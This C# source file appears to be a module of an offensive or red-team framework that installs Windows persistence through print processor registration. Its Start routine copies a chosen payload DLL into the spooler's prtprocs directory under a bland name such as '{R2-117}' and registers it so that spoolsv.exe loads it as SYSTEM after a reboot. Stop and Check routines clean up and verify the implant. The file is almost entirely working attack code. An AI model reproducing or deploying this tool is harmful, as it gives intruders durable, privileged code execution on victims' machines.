using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string RegPath =
            @"SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors";

        private const string SpoolDir =
            @"C:\Windows\System32\spool\prtprocs\x64";

        private const uint MOVEFILE_DELAY_UNTIL_REBOOT = 0x04;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool MoveFileEx(
            string lpExistingFileName,
            string lpNewFileName,
            uint dwFlags);

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultName = "{R2-117}";
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 printproc_dlls Start {defaultName} {defaultPayload}";
        }

        public static string Start(string[] args)
        {
            string name = (args != null &&
                           args.Length > 0 &&
                           !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "{R2-117}";

            string payloadPath = (args != null &&
                                  args.Length > 1 &&
                                  !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : GetDefaultPayloadPath();

            try
            {
                using var baseKey =
                    Registry.LocalMachine.OpenSubKey(RegPath, writable: true);

                if (baseKey == null)
                    return "[-] Access denied opening Print Processors registry key. Run as administrator.";

                using var existing = baseKey.OpenSubKey(name);

                if (existing != null)
                    return $"[*] Print processor '{name}' already registered.";

                string dllName = Path.GetFileName(payloadPath);
                string targetPath = Path.Combine(SpoolDir, dllName);

                if (!Directory.Exists(SpoolDir))
                    Directory.CreateDirectory(SpoolDir);

                if (!File.Exists(targetPath))
                    File.Copy(payloadPath, targetPath, overwrite: false);

                using var processorKey =
                    baseKey.CreateSubKey(name, writable: true);

                if (processorKey == null)
                    return $"[-] Failed to create processor subkey '{name}'.";

                processorKey.SetValue("Driver", dllName);

                return $"[+] Installed print processor '{name}' | " +
                       $"DLL copied to: '{targetPath}' | " +
                       $"Reboot required to load into spoolsv.exe.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Print processor registration requires administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string name = (args != null &&
                           args.Length > 0 &&
                           !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "{R2-117}";

            try
            {
                using var baseKey =
                    Registry.LocalMachine.OpenSubKey(RegPath, writable: true);

                if (baseKey == null)
                    return "[-] Access denied opening Print Processors registry key. Run as administrator.";

                using var existing = baseKey.OpenSubKey(name);

                if (existing == null)
                    return $"[*] Print processor '{name}' not found.";

                string dllName = existing.GetValue("Driver")?.ToString();

                baseKey.DeleteSubKeyTree(name);

                if (!string.IsNullOrEmpty(dllName))
                {
                    string targetPath = Path.Combine(SpoolDir, dllName);

                    if (File.Exists(targetPath))
                    {
                        try
                        {
                            File.Delete(targetPath);
                        }
                        catch (IOException)
                        {
                            bool scheduled = MoveFileEx(
                                targetPath,
                                null,
                                MOVEFILE_DELAY_UNTIL_REBOOT);

                            if (scheduled)
                            {
                                return $"[+] Removed registry for '{name}'. " +
                                       "DLL is locked but scheduled for deletion on reboot.";
                            }

                            return $"[-] Registry removed, but failed to schedule DLL deletion. " +
                                   $"Error: {Marshal.GetLastWin32Error()}";
                        }
                    }
                }

                return $"[+] Removed print processor '{name}' and deleted DLL.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Print processor removal requires administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string name = (args != null &&
                           args.Length > 0 &&
                           !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "{R2-117}";

            try
            {
                using var baseKey =
                    Registry.LocalMachine.OpenSubKey(RegPath, writable: false);

                if (baseKey == null)
                    return "[-] Access denied opening Print Processors registry key. Run as administrator.";

                using var processorKey = baseKey.OpenSubKey(name);

                if (processorKey == null)
                    return $"[*] Print processor '{name}' not found.";

                string dllName = processorKey.GetValue("Driver")?.ToString();
                string dllPath = Path.Combine(SpoolDir, dllName ?? "");
                bool dllExists = File.Exists(dllPath);

                return $"[+] Verified print processor '{name}' | " +
                       $"Driver: '{dllName}' | " +
                       $"DLL in spool directory: {dllExists}";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during verification: {ex.Message}";
            }
        }
    }
}